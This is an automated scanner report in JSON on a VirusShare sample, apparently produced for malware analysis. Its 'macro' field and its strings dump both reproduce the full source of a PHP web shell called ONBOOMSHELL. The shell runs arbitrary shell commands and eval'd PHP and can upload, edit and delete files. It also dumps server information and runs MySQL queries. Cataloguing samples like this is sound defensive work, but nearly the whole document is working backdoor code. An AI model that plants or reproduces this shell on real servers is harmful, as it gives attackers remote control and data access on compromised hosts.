{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "mkdir": "May create a directory",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "?php\n//ONBOOMSHELL V 0.1 by ~cobra90nj contact: cobra90nj@gmail.com\necho \"DiskSpace \".disk_total_space(getcwd()).\"<br>\";\necho \"DiskSpaceFree \".diskfreespace(getcwd()).\"<br>\";\nif (function_exists(\"mysql_connect\")){echo \"My_SQL ON<br>\";}else{echo \"My_SQL OFF<br>\";}\nif (function_exists(\"curl_version\")){echo \"cURL ON<br>\";}else{echo \"cURL OFF<br>\";}\necho \"Magic_Quotes \".get_magic_quotes_gpc().\"<br>\";\necho $_SERVER[\"HTTP_HOST\"].\"<br>\";\necho php_uname().\"<br>\";\necho getenv(\"SERVER_SOFTWARE\").\"<br>\";\necho phpversion().\"<br>\";\n$diratt = realpath($_POST[\"dir\"]);\necho \"<form action='' method='post'>\n   <input type='text' method='post' name='dir' size='50' value='$diratt'>\n        <input type='submit' value='Dir'>\n      </form>\";\necho \"<form enctype='multipart/form-data' method='POST'>\n   <input type='file' name='file'>\n   <input type='submit' name='send' value='   Send file   '></center>\n   </form>\";\necho \"<form method='post'>\n   <input type='text' name='edit' size='10'>\n   <input type='submit' value='Edit'><br>\n      </form>\";\necho \"<form method='post'>\n   <input type='text' name='delete' size='10'>\n   <input type='submit' value='Delete'><br>\n      </form>\";\necho \"<form method='post'>\n   <input type='text' name='makefile' size='10'>\n   <input type='submit' value='MakeFile'><br>\n      </form>\";\necho \"<form method='post'>\n   <input type='text' name='makedir' size='10'>\n   <input type='submit' value='MakeDir'><br>\n      </form>\";\necho \"<form method='post'>\n   <input type='text' name='comandexe' size='10'>\n   <select name='command'>   \n   <option value='system'>System</option>\n   <option value='passthru'>Passthru</option>\n   <option value='shell_exec'>Shell_exec</option>\n   <option value='exec'>Exec</option>\n   </select>\n        <input type='submit' value='ExecuteCommand'>\n      </form>\";\necho \"<form method='post' name='eval'>\n   <input type='hidden' name='tools' value='eval'>\n   <input type='submit' name='eval' value='Eval'>\n      </form>\";\necho \"<form method='post' name='phpinfo'>\n   <input type='hidden' name='tools' value='phpinfo'>\n   <input type='submit' value='PhpInfo'>\n      </form>\";\necho \"<form method='post'>\n   <input type='hidden' name='tools' value='hashing'>\n   <input type='submit' value='Hashing'>\n      </form>\";\necho \"<form method='post'>\n   <input type='hidden' name='tools' value='mysql'>\n   <input type='submit' value='MySql'>\n      </form>\";\n   if ($dirfile = opendir($diratt))\n{\nwhile (false !== ($filedir = readdir($dirfile)))\n   {\n   $filesiz = sprintf(\"%01.2f\", filesize(\"$diratt/$filedir\")/1024);\n   $groupid = posix_getpwuid(fileowner(\"$diratt/$filedir\"));\n        $groupinfo = posix_getgrgid(filegroup(\"$diratt/$filedir\"));\n   $ow = $groupid[name] .\" \". $groupinfo[name];\n   $info = get_perms(\"$diratt/$filedir\");\nif ($filedir != \".\" && $filedir != \"..\")\n   {\nif (is_file(\"$diratt/$filedir\"))\n   {\necho \"<table border='1' width='60%'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='20%'>$info</td><td width='15%'>$filesiz K</td></tr></table>\";\n   }\nelse\n   {\necho \"<table border='1' width='60%'bgcolor='red'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='35%'>$info</td></tr></table>\";\n   }\n   }\n   }\n}\nif (isset($_POST[\"edit\"]))\n{\n$filedir = $_POST[\"edit\"];\n$filedit = file_get_contents($filedir);\necho \"<form action='' method='post'>\n   <textarea cols='80' rows='20' name='savetest'>\".htmlspecialchars($filedit).\"</textarea><br>\n   <font size='1'>File name:</font><input type='text' name='save' size='10' value='\".$_POST[\"edit\"].\"'>\n   <input type='submit' value='Save'>\n      </form>\";\n}\nif (isset($_POST[\"savetest\"]) && isset($_POST[\"save\"]))\n{\n$testnew = $_POST[\"savetest\"];\n$filedir = $_POST[\"save\"];\n$fail = fopen($filedir, \"w+\");\nfwrite($fail, $testnew);\nfclose($fail);\n}\n$comand = $_POST[\"comandexe\"];\n$method = $_POST[\"command\"];\nif (isset($comand) && isset($method))\n{\nif ($method == \"system\")\n{\n   echo system($comand);\n}\nelseif ($method == \"passthru\")\n{\n   echo passthru($comand);\n}\nelseif ($method == \"shell_exec\")\n{\n   shell_exec($comand);\n}\nelseif ($method == \"exec\")\n{\n   echo exec($comand);\n}\n}\nif (isset($_POST[\"delete\"]))\n{\n$filedir = $_POST[\"delete\"];\necho \"<form method='post' name='yes'><font size='1'>Delte file:</font>\n   <input type='text' name='delete' size='10' value='\".$_POST[\"delete\"].\"'>\n   <input type='submit' name='yes' value='Yes' size='5'>\n     </form>\";\nif (isset($_POST[\"yes\"]) && isset($_POST[\"delete\"]))\n{\nchmod($filedir, 0777);\nunlink($filedir);\n}\n}\nif (isset($_POST[\"makefile\"]))\n{\n$namefile = $_POST[\"makefile\"];\necho \"<form method='post'>\n   <textarea cols='80' rows='20' name='savetest'></textarea><br>\n   <input type='text' name='delete' size='10' value='\".$_POST[\"makefile\"].\"'>\n      <input type='submit' value='Make'>\n      </form>\";\n}\nif (isset($_POST[\"savetest\"]))\n{\n$testnew = $_POST[\"savetest\"];\n$filedir = $_POST[\"makefile\"];\n$fail = fopen($filedir, \"w+\");\nfwrite($fail, $testnew);\nfclose($fail);\n}\nif (isset($_POST[\"makedir\"]))\n{\n$makedir = $_POST[\"makedir\"];\nmkdir($makedir);\n}\n$switch = $_POST[\"tools\"];\nif ($_POST[\"send\"])\n{\nif (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $diratt.\"/\".$_FILES[\"file\"][\"name\"])){unset($_FILES[\"file\"][\"tmp_name\"]);}\n}\nswitch ($switch)\n{\n   case \"hashing\":\necho \"<form method='post'>\n   <input type='text' size='30' name='testo'>\n   <input type='submit' value='Estimated'>\n   <input type='hidden' name='tools' value='hashing'>\n   <select name='algoritmo'>\";   \n$algoritmi = hash_algos();\nforeach ($algoritmi as $algoritmif)\n   {\necho \"<option value=\\\"$algoritmif\\\">\\\"$algoritmif\\\"</option>\";\n   }\necho \"</select>\";\necho \"</form>\";\n$testo = $_POST[\"testo\"];\n$algoritmo = $_POST[\"algoritmo\"];\nif (isset($testo) && isset($algoritmo))\n{\nif (array_search($algoritmo, $algoritmi))\n   {\n$hashing = hash($algoritmo, $testo);\necho \"This is your encrypted string: <input type='text' size='50' value=$hashing>\";\n   }\n}\n   break;\n   case \"phpinfo\":\nphpinfo();\n   break;\n   case \"eval\":\necho \"<form method='post' name='evaltext'>\n   <textarea cols='80' rows='20' name='evaltext'></textarea><br>\n   <input type='hidden' name='tools' value='eval'>\n        <input type='submit' value='Eval'>\n      </form>\";\nif (isset($_POST[\"evaltext\"]))\n{\n$evals = $_POST[\"evaltext\"];\neval($evals);\n}\n   break;\n   case \"mysql\":\necho \"<form method='post'>\n   <input type='text' name='name' value='name'><br>\n   <input type='text' name='password' value='password'><br>\n   <input type='text' name='namedb' value='nameDB'><br>\n   <input type='text' name='query' value='query'><br>\n     <input type='hidden' name='tools' value='mysql'>\n     <input type='submit' value='SendQuery'>\n     </from>\";\n$name = $_POST[\"name\"];\n$password = $_POST[\"password\"];\n$namedb = $_POST[\"namedb\"];\n$query = $_POST[\"query\"];\nif (isset($name) && isset($password) && isset($namedb) && isset($query))\n{\n$connect = mysql_connect(\"localhost\", $name, $password);\n$databselect = mysql_select_db($namedb, $connect);\n$selquery = mysql_query($query, $connect);\nwhile ($result = @mysql_fetch_array($selquery))\n{\n   echo \"$result[0]<br>\";\n}\n}\nbreak;\n}\nfunction get_perms($filedir)   //PHP.net\n{\n$perms = @fileperms($filedir);\nif($perms==false)  return false;\n$info='';\n// Owner\n$info .= (($perms & 0x0100) ? 'r' : '-');\n$info .= (($perms & 0x0080) ? 'w' : '-');\n$info .= (($perms & 0x0040) ?\n            (($perms & 0x0800) ? 's' : 'x' ):\n            (($perms & 0x0800) ? 'S' : '-'));\n// Group\n$info .= (($perms & 0x0020) ? 'r' : '-');\n$info .= (($perms & 0x0010) ? 'w' : '-');\n$info .= (($perms & 0x0008) ?\n            (($perms & 0x0400) ? 's' : 'x' ):\n            (($perms & 0x0400) ? 'S' : '-'));\n// World\n$info .= (($perms & 0x0004) ? 'r' : '-');\n$info .= (($perms & 0x0002) ? 'w' : '-');\n$info .= (($perms & 0x0001) ?\n            (($perms & 0x0200) ? 't' : 'x' ):\n            (($perms & 0x0200) ? 'T' : '-'));\nreturn $info;\n}\n?>"
    },
    "filename": "VirusShare_0573490b928032048f6e0adf87522583",
    "filesize": 8083,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "0573490b928032048f6e0adf87522583",
        "sha1": "5e131a0f32751c0501330ce54d1771610eb51f45",
        "sha256": "64d9630394b634e427e8400aadb46562bdec7e97899c63a0da8ea25aff8d2207"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "?php",
            "//ONBOOMSHELL V 0.1 by ~cobra90nj contact: cobra90nj@gmail.com",
            "echo \"DiskSpace \".disk_total_space(getcwd()).\"<br>\";",
            "echo \"DiskSpaceFree \".diskfreespace(getcwd()).\"<br>\";",
            "if (function_exists(\"mysql_connect\")){echo \"My_SQL ON<br>\";}else{echo \"My_SQL OFF<br>\";}",
            "if (function_exists(\"curl_version\")){echo \"cURL ON<br>\";}else{echo \"cURL OFF<br>\";}",
            "echo \"Magic_Quotes \".get_magic_quotes_gpc().\"<br>\";",
            "echo $_SERVER[\"HTTP_HOST\"].\"<br>\";",
            "echo php_uname().\"<br>\";",
            "echo getenv(\"SERVER_SOFTWARE\").\"<br>\";",
            "echo phpversion().\"<br>\";",
            "$diratt = realpath($_POST[\"dir\"]);",
            "echo \"<form action='' method='post'>",
            "   <input type='text' method='post' name='dir' size='50' value='$diratt'>",
            "        <input type='submit' value='Dir'>",
            "      </form>\";",
            "echo \"<form enctype='multipart/form-data' method='POST'>",
            "   <input type='file' name='file'>",
            "   <input type='submit' name='send' value='   Send file   '></center>",
            "   </form>\";",
            "echo \"<form method='post'>",
            "   <input type='text' name='edit' size='10'>",
            "   <input type='submit' value='Edit'><br>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='text' name='delete' size='10'>",
            "   <input type='submit' value='Delete'><br>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='text' name='makefile' size='10'>",
            "   <input type='submit' value='MakeFile'><br>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='text' name='makedir' size='10'>",
            "   <input type='submit' value='MakeDir'><br>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='text' name='comandexe' size='10'>",
            "   <select name='command'>   ",
            "   <option value='system'>System</option>",
            "   <option value='passthru'>Passthru</option>",
            "   <option value='shell_exec'>Shell_exec</option>",
            "   <option value='exec'>Exec</option>",
            "   </select>",
            "        <input type='submit' value='ExecuteCommand'>",
            "      </form>\";",
            "echo \"<form method='post' name='eval'>",
            "   <input type='hidden' name='tools' value='eval'>",
            "   <input type='submit' name='eval' value='Eval'>",
            "      </form>\";",
            "echo \"<form method='post' name='phpinfo'>",
            "   <input type='hidden' name='tools' value='phpinfo'>",
            "   <input type='submit' value='PhpInfo'>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='hidden' name='tools' value='hashing'>",
            "   <input type='submit' value='Hashing'>",
            "      </form>\";",
            "echo \"<form method='post'>",
            "   <input type='hidden' name='tools' value='mysql'>",
            "   <input type='submit' value='MySql'>",
            "      </form>\";",
            "   if ($dirfile = opendir($diratt))",
            "while (false !== ($filedir = readdir($dirfile)))",
            "   {",
            "   $filesiz = sprintf(\"%01.2f\", filesize(\"$diratt/$filedir\")/1024);",
            "   $groupid = posix_getpwuid(fileowner(\"$diratt/$filedir\"));",
            "        $groupinfo = posix_getgrgid(filegroup(\"$diratt/$filedir\"));",
            "   $ow = $groupid[name] .\" \". $groupinfo[name];",
            "   $info = get_perms(\"$diratt/$filedir\");",
            "if ($filedir != \".\" && $filedir != \"..\")",
            "   {",
            "if (is_file(\"$diratt/$filedir\"))",
            "   {",
            "echo \"<table border='1' width='60%'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='20%'>$info</td><td width='15%'>$filesiz K</td></tr></table>\";",
            "   }",
            "else",
            "   {",
            "echo \"<table border='1' width='60%'bgcolor='red'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='35%'>$info</td></tr></table>\";",
            "   }",
            "   }",
            "   }",
            "if (isset($_POST[\"edit\"]))",
            "$filedir = $_POST[\"edit\"];",
            "$filedit = file_get_contents($filedir);",
            "echo \"<form action='' method='post'>",
            "   <textarea cols='80' rows='20' name='savetest'>\".htmlspecialchars($filedit).\"</textarea><br>",
            "   <font size='1'>File name:</font><input type='text' name='save' size='10' value='\".$_POST[\"edit\"].\"'>",
            "   <input type='submit' value='Save'>",
            "      </form>\";",
            "if (isset($_POST[\"savetest\"]) && isset($_POST[\"save\"]))",
            "$testnew = $_POST[\"savetest\"];",
            "$filedir = $_POST[\"save\"];",
            "$fail = fopen($filedir, \"w+\");",
            "fwrite($fail, $testnew);",
            "fclose($fail);",
            "$comand = $_POST[\"comandexe\"];",
            "$method = $_POST[\"command\"];",
            "if (isset($comand) && isset($method))",
            "if ($method == \"system\")",
            "   echo system($comand);",
            "elseif ($method == \"passthru\")",
            "   echo passthru($comand);",
            "elseif ($method == \"shell_exec\")",
            "   shell_exec($comand);",
            "elseif ($method == \"exec\")",
            "   echo exec($comand);",
            "if (isset($_POST[\"delete\"]))",
            "$filedir = $_POST[\"delete\"];",
            "echo \"<form method='post' name='yes'><font size='1'>Delte file:</font>",
            "   <input type='text' name='delete' size='10' value='\".$_POST[\"delete\"].\"'>",
            "   <input type='submit' name='yes' value='Yes' size='5'>",
            "     </form>\";",
            "if (isset($_POST[\"yes\"]) && isset($_POST[\"delete\"]))",
            "chmod($filedir, 0777);",
            "unlink($filedir);",
            "if (isset($_POST[\"makefile\"]))",
            "$namefile = $_POST[\"makefile\"];",
            "echo \"<form method='post'>",
            "   <textarea cols='80' rows='20' name='savetest'></textarea><br>",
            "   <input type='text' name='delete' size='10' value='\".$_POST[\"makefile\"].\"'>",
            "      <input type='submit' value='Make'>",
            "      </form>\";",
            "if (isset($_POST[\"savetest\"]))",
            "$testnew = $_POST[\"savetest\"];",
            "$filedir = $_POST[\"makefile\"];",
            "$fail = fopen($filedir, \"w+\");",
            "fwrite($fail, $testnew);",
            "fclose($fail);",
            "if (isset($_POST[\"makedir\"]))",
            "$makedir = $_POST[\"makedir\"];",
            "mkdir($makedir);",
            "$switch = $_POST[\"tools\"];",
            "if ($_POST[\"send\"])",
            "if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $diratt.\"/\".$_FILES[\"file\"][\"name\"])){unset($_FILES[\"file\"][\"tmp_name\"]);}",
            "switch ($switch)",
            "   case \"hashing\":",
            "echo \"<form method='post'>",
            "   <input type='text' size='30' name='testo'>",
            "   <input type='submit' value='Estimated'>",
            "   <input type='hidden' name='tools' value='hashing'>",
            "   <select name='algoritmo'>\";   ",
            "$algoritmi = hash_algos();",
            "foreach ($algoritmi as $algoritmif)",
            "   {",
            "echo \"<option value=\\\"$algoritmif\\\">\\\"$algoritmif\\\"</option>\";",
            "   }",
            "echo \"</select>\";",
            "echo \"</form>\";",
            "$testo = $_POST[\"testo\"];",
            "$algoritmo = $_POST[\"algoritmo\"];",
            "if (isset($testo) && isset($algoritmo))",
            "if (array_search($algoritmo, $algoritmi))",
            "   {",
            "$hashing = hash($algoritmo, $testo);",
            "echo \"This is your encrypted string: <input type='text' size='50' value=$hashing>\";",
            "   }",
            "   break;",
            "   case \"phpinfo\":",
            "phpinfo();",
            "   break;",
            "   case \"eval\":",
            "echo \"<form method='post' name='evaltext'>",
            "   <textarea cols='80' rows='20' name='evaltext'></textarea><br>",
            "   <input type='hidden' name='tools' value='eval'>",
            "        <input type='submit' value='Eval'>",
            "      </form>\";",
            "if (isset($_POST[\"evaltext\"]))",
            "$evals = $_POST[\"evaltext\"];",
            "eval($evals);",
            "   break;",
            "   case \"mysql\":",
            "echo \"<form method='post'>",
            "   <input type='text' name='name' value='name'><br>",
            "   <input type='text' name='password' value='password'><br>",
            "   <input type='text' name='namedb' value='nameDB'><br>",
            "   <input type='text' name='query' value='query'><br>",
            "     <input type='hidden' name='tools' value='mysql'>",
            "     <input type='submit' value='SendQuery'>",
            "     </from>\";",
            "$name = $_POST[\"name\"];",
            "$password = $_POST[\"password\"];",
            "$namedb = $_POST[\"namedb\"];",
            "$query = $_POST[\"query\"];",
            "if (isset($name) && isset($password) && isset($namedb) && isset($query))",
            "$connect = mysql_connect(\"localhost\", $name, $password);",
            "$databselect = mysql_select_db($namedb, $connect);",
            "$selquery = mysql_query($query, $connect);",
            "while ($result = @mysql_fetch_array($selquery))",
            "   echo \"$result[0]<br>\";",
            "break;",
            "function get_perms($filedir)   //PHP.net",
            "$perms = @fileperms($filedir);",
            "if($perms==false)  return false;",
            "$info='';",
            "// Owner",
            "$info .= (($perms & 0x0100) ? 'r' : '-');",
            "$info .= (($perms & 0x0080) ? 'w' : '-');",
            "$info .= (($perms & 0x0040) ?",
            "            (($perms & 0x0800) ? 's' : 'x' ):",
            "            (($perms & 0x0800) ? 'S' : '-'));",
            "// Group",
            "$info .= (($perms & 0x0020) ? 'r' : '-');",
            "$info .= (($perms & 0x0010) ? 'w' : '-');",
            "$info .= (($perms & 0x0008) ?",
            "            (($perms & 0x0400) ? 's' : 'x' ):",
            "            (($perms & 0x0400) ? 'S' : '-'));",
            "// World",
            "$info .= (($perms & 0x0004) ? 'r' : '-');",
            "$info .= (($perms & 0x0002) ? 'w' : '-');",
            "$info .= (($perms & 0x0001) ?",
            "            (($perms & 0x0200) ? 't' : 'x' ):",
            "            (($perms & 0x0200) ? 'T' : '-'));",
            "return $info;"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "if (function_exists(\"curl_version\")){echo \"cURL ON<br>\";}else{echo \"cURL OFF<br>\";}"
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.318861",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
